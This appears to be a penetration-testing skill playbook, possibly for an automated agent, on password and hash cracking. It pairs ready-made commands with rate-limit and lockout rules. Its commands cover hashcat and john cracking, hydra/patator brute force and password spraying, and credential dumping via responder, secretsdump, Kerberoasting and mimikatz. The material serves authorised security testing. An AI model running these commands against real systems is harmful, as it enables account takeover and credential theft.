# Hash & Password Cracking — Skill Playbook (Rate-Limit Aware)

**Mitre ATT&CK ID:** T1110 (Brute Force) / T1110.002 (Password Cracking)
**OWASP Mapping:** A07:2021 – Identification and Authentication Failures
**Severity:** High / Critical (when credentials are recovered)
**Last Updated:** 2026-08-04

---

## Metadata

```yaml
skill_id: hash-password-cracking-v1
category: credential-attacks
author: HiveBreach
mitre_attack_id: T1110.002
owasp_mapping:
  - A07:2021-IdentificationandAuthenticationFailures
tags:
  - hashcat
  - john
  - password
  - cracking
  - brute-force
  - offline
  - online
  - rate-limit
  - T1110
  - T1110.002
  - T1110.003
environments:
  - network
  - web
  - active-directory
  - cloud
verification_required: sandbox
```

---

## 1. The Two Cracking Domains

| Domain | When | Examples | Rate-Limit Concern |
|---|---|---|---|
| **Offline** (hash cracking) | You have the hash | `$2y$10$...` bcrypt, NTLM, Kerberoast tickets | None (local GPU/CPU) |
| **Online** (service brute-force) | You have a service, not a hash | SSH, HTTP login, RDP | **HIGH** — must be rate-limit aware |

**Rule:** Prefer offline cracking whenever a hash exists. Online brute-force is last resort, tightly rate-limited, and auto-terminating.

---

## 2. Offline Hash Cracking

### 2.1 Hash Identification

```bash
# Identify hash type
hashid -m '<hash>'
hashcat --identify '<hash>'
john --format=auto --show hash.txt

# Common types reference
# $2y$10$...  = bcrypt (3200)
# $6$...      = sha512crypt (1800)
# NTLM 32-hex = NTLM (1000)
# $krb5tgs$   = Kerberoast ticket (13100)
# $1$...      = md5crypt (500)
# 32-hex lowercase = MD5 (0), 40-hex = SHA1 (100)
# zip2john / rar2john / ssh2john outputs
```

### 2.2 Attack Strategy (ordered by value)

```bash
# 1. Wordlist with rules (fastest wins)
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O --force

# 2. Rule-based on leaked/company wordlist (build context)
#    e.g. company name + year patterns

# 3. Combinator / mask for known patterns
hashcat -m <mode> hash.txt -a 3 '?u?l?l?l?d?d?d'       # e.g. Abcd123
hashcat -m <mode> hash.txt -a 1 wordlist1.txt wordlist2.txt  # combinator

# 4. GPU-optimized
hashcat -m <mode> hash.txt -a 0 rockyou.txt -r best64.rule -O -w 3 -D 1,2 --opencl-device-types 1,2

# 5. John for formats hashcat lacks
john --wordlist=rockyou.txt --rules=best64 hash.txt
john --show hash.txt
```

### 2.3 Mode Reference Table

| Hash | Mode | Speed |
|---|---|---|
| NTLM | 1000 | Fast |
| MD5 | 0 | Fast |
| SHA1 | 100 | Fast |
| SHA256 | 1400 | Fast |
| md5crypt ($1$) | 500 | Med |
| sha512crypt ($6$) | 1800 | Med |
| bcrypt ($2*) | 3200 | **Slow** (high cost) |
| Kerberoast ($krb5tgs$) | 13100 | Med |
| AS-REP roast ($krb5asrep$) | 18200 | Med |
| WPA-PBKDF2 | 22000 | Slow |
| ZIP (zip2john) | 17225 | Med |

### 2.4 Cracking Priority Rules

1. **Start with low-cost fast hashes** (NTLM/MD5/SHA1) — quick wins
2. **Use rules + wordlist before masks** — masks are last resort
3. **Context-aware wordlist building** (company, dates, patterns) beats generic
4. **Never crack beyond PoC need (R4)** — stop after demonstrating weakness

---

## 3. Online Brute-Force (Rate-Limit Aware) — THE CRITICAL SECTION

### 3.1 Rate-Limit Detection (do this FIRST)

```bash
# 1. Single test request to observe behavior
curl -s -o /dev/null -w "%{http_code} %{time_total}\n" -X POST <login-url> -d "user=x&pass=y"

# 2. Probe with 3-5 harmless requests, watch for:
#    - HTTP 429 Too Many Requests
#    - Account lockout responses (500/403 after N fails)
#    - Connection reset / TCP timeout
#    - Captcha / JS challenge / rate-limit page
```

**If rate limiting is present:** record the threshold, then either:
- **Honor it** (pace at ≤ observed limit, e.g. if server allows 5 req/s → use 4/s), OR
- **Terminate** the online attack entirely and switch to offline/other vector

### 3.2 The Request-Based Policy (per user request)

```
If rate limiting observed (e.g. ~5 req/sec allowed):
  1. Set request pacing to allowed_limit - 1  (e.g. 4 req/s max)
  2. Cap total attempts per account (e.g. ≤10 before lockout risk)
  3. Set a hard attempt budget and terminator trigger
  4. MONITOR: if 429/throttle responses appear -> immediately back off 10x
  5. TERMINATE when any of:
     - 429 responses observed ≥ 5 times
     - Lockout feedback from server (account disabled)
     - Budget exhausted
     - Detection indicators (WAF block, connection drops)
  -> terminate gracefully, log, and report rate-limit findings
```

### 3.3 Tools + Rate-Limit Config

```bash
# Hydra with slow pace (-t low threads, -W wait, -f stop on found)
hydra -l <user> -P rockyou.txt <target> ssh -t 4 -W 2 -f

# Medusa with delay
medusa -h <target> -u <user> -P rockyou.txt -M ssh -t 3 -b 2

# Patator (HTTP forms, per-request delay)
patator http_fuzz url=<login> method=POST body='user=admin&pass=FILE0' \
  0=rockyou.txt -x ignore:code=401 -t 3 --rate-limit=4

# Sucrack / ncrack (avoid — heavy); prefer Hydra/Patator with delay
ncrack --user admin -P rockyou.txt <target>:ssh -T 3 --delay 2

# WPScan for WordPress (respects --request-timeout, throttle)
wpscan --url <target> --passwords rockyou.txt --username admin --max-threads 3
```

**Do NOT use:** `-t 64`, parallel sessions to the same account, or default aggressive configs — they trigger lockout (R3) and detection.

### 3.4 Password Spraying (safer than brute-force)

```bash
# One password across many usernames — far less lockout risk
hydra -L usernames.txt -p "Winter2026!" <target> ssh -t 2
# Or with CredMaster / SprayingToolkit:
#   setspray.py / msolspray.py (Azure AD)
#   o365creeper.py -f emails.txt
```
**Spraying rule:** max 1 attempt per user per 30 min window; never spray default creds against real user accounts without explicit authorization.

---

## 4. Hash Harvesting (feeds offline cracking)

```bash
# Responder - capture NTLMv2 on the wire (authorized internal test)
responder -I eth0 -wdF

# Impacket secretsdump (with compromised admin)
secretsdump.py <domain>/<user>:<pass>@<target>
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# Kerberoasting (domain account)
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc> -request   # impacket
# AS-REP roasting
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc>     # no preauth required

# Dump from local (authorized host access)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
hashdump (metasploit post)
```

---

## 5. Finding Template

```markdown
## [FINDING_ID] — [TITLE]
Type: offline-crack | online-brute | credential-reuse
Hash/Service: <hash type or service+port>
Recovered: <username>:<REDACTED or "cracked">   (R8: never print plaintext in committed files)
Method: <wordlist+rule / mask / spray>
Rate limiting observed: <5 req/s | none | lockout at 10 fails>
Evidence:
  - <hashcat output line>
  - <hydra result>
  - <two independent confirmations>
Impact:
  - <what this credential unlocks>
Remediation:
  - <MFA, password policy, lockout policy, network segmentation>
Confidence: confirmed
```

**R8 Note:** Cracked passwords are written to the vault (AES-256-GCM), never committed in plaintext. Use `<REDACTED>` in skill files / reports.

---

## 6. Verification (Sandbox)

- [ ] Hash cracked in sandbox/local GPU (never against production)
- [ ] Online attack followed §3.2 rate-limit policy
- [ ] No account lockout caused (verify no lockouts in logs)
- [ ] Credential validity re-confirmed against test instance only
- [ ] Plaintext passwords not committed (R8)

---

## 7. Decision Flow (auto-terminate logic)

```
Online brute-force? 
  -> Detect rate limit (probe)
  -> No rate limit: use conservative default (≤4 req/s, ≤10/user)
  -> Rate limit at N/s: pace at N-1
  -> 429/lockout detected: 
        backoff 10x
        if persists >5 times: TERMINATE attack vector
        log and report (rate-limit itself is a finding)
```

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1110 | Brute Force | Online attack |
| T1110.002 | Password Cracking | Offline hash crack |
| T1110.003 | Password Spraying | Spraying |
| T1110.001 | Password Guessing | Dictionary attack |
| T1110.004 | Credential Stuffing | Reuse of leaked creds |
| T1558.003 | Kerberoasting | Hash harvesting |
| T1558.004 | AS-REP Roasting | Hash harvesting |

---

## 9. References

- MITRE ATT&CK T1110: https://attack.mitre.org/techniques/T1110/
- hashcat wiki: https://hashcat.net/wiki/
- John the Ripper: https://www.openwall.com/john/
- PayloadsAllTheThings (Password): https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Credentials%20Reuse
- HackTricks (Brute force): https://book.hacktricks.xyz/pentesting-hacking/brute-force
- Impacket: https://github.com/fortra/impacket

---

*This playbook is for authorised security testing only. Online brute-force is governed by the §3 rate-limit policy — honor observed limits or terminate. Recovered credentials are proof-of-impact samples (R4), stored encrypted (R8).*
